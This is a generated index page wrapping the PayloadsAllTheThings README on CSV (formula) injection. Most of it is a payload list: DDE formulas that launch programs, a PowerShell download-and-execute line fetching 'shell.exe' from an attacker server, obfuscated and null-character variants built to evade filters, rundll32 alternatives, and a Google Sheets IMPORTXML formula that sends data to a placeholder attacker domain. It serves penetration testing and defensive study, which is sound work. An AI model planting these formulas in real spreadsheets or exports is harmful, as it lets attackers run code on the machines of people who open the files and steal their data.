---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# CSV Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-csv-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CSV Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CSV Injection](../../topics/csv-injection/csv-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-csv-injection-readme |
| name | CSV Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSV%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# CSV Injection\n\n> Many web applications allow the user to download content such as templates for invoices or user\
  \ settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web\
  \ application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells\
  \ being executed.\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Google Sheets](#google-sheets)\n* [References](#references)\n\
  \n## Methodology\n\nCSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted\
  \ input is included in a CSV file. Any formula can be started with:\n\n```text\n=\n+\n–\n@\n```\n\nBasic exploits with **Dynamic\
  \ Data Exchange**.\n\n* Spawn a calc\n\n    ```text\n    DDE (\"cmd\";\"/C calc\";\"!A0\")A0\n    @SUM(1+1)*cmd|' /C calc'!A0\n\
  \    =2+5+cmd|' /C calc'!A0\n    =cmd|' /C calc'!'A1'\n    ```\n\n* PowerShell download and execute\n\n    ```text\n   \
  \ =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0\n    ```\n\n* Prefix obfuscation and command chaining\n\n\
  \    ```text\n    =AAAA+BBBB-CCCC&\"Hello\"/12345&cmd|'/c calc.exe'!A\n    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A\n  \
  \  =         cmd|'/c calc.exe'!A\n    ```\n\n* Using rundll32 instead of cmd\n\n    ```text\n    =rundll32|'URL.dll,OpenURL\
  \ calc.exe'!A\n    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A\n    ```\n\n* Using null characters\
  \ to bypass dictionary filters. Since they are not spaces, they are ignored when executed.\n\n    ```text\n    =    C  \
  \  m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A\n    ```\n\
  \nTechnical details of the above payloads:\n\n* `cmd` is the name the server can respond to whenever a client is trying\
  \ to access the server\n* `/C` calc is the file name which in our case is the calc(i.e the calc.exe)\n* `!A0` is the item\
  \ name that specifies unit of data that a server can respond when the client is requesting the data\n\n### Google Sheets\n\
  \nGoogle Sheets allows some additional formulas that are able to fetch remote URLs:\n\n* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url,\
  \ xpath_query, locale)\n* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)\n\
  * [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)\n* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url,\
  \ [query], [headers], [num_items])\n* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)\n\nSo one can test\
  \ blind formula injection or a potential for data exfiltration with:\n\n```text\n=IMPORTXML(\"http://[ATTACKER.DOMAIN.TLD]/csv\"\
  , \"//a/@href\")\n```\n\nNote: an alert will warn the user a formula is trying to contact an external resource and ask for\
  \ authorization.\n\n## References\n\n* [CSV Excel Macro Injection - Timo Goosen, Albinowax - June 21, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)\n\
  * [CSV Excel formula injection - Google Bug Hunter University - May 22, 2022](https://web.archive.org/web/20251126193606/https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)\n\
  * [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - November 30, 2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)\n\
  * [From CSV to Meterpreter - Adam Chester - November 5, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)\n\
  * [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - October 7, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)\n\
  * [Three New DDE Obfuscation Methods - ReversingLabs - September 24, 2018](https://web.archive.org/web/20220928031043/https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)\n\
  * [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020](https://web.archive.org/web/20260115180627/https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)"
_relative_path: CSV Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CSV Injection/README.md
````
